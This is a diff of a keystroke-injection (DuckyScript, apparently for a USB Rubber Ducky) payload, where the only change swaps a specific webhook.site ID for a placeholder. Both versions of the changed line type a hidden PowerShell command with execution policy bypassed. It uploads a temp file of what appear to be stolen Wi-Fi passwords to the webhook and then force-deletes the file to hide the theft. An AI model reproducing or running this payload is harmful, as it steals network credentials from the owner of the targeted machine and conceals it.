@@ -6,7 +6,7 @@ ENTER
 DELAY 100
 GUI r
 DELAY 200
-STRING powershell -w h -ep bypass Invoke-WebRequest -Uri https://webhook.site/ac411e28-1198-4cbd-851e-74aa9cb5a5d2 -Method POST -InFile $env:tmp\Wi-Fi-PASS;Remove-Item $env:tmp\Wi-Fi-PASS -Force -ErrorAction SilentlyContinue
+STRING powershell -w h -ep bypass Invoke-WebRequest -Uri https://webhook.site/<Unique Webhook URL> -Method POST -InFile $env:tmp\Wi-Fi-PASS;Remove-Item $env:tmp\Wi-Fi-PASS -Force -ErrorAction SilentlyContinue
 ENTER
 DELAY 100
 GUI r
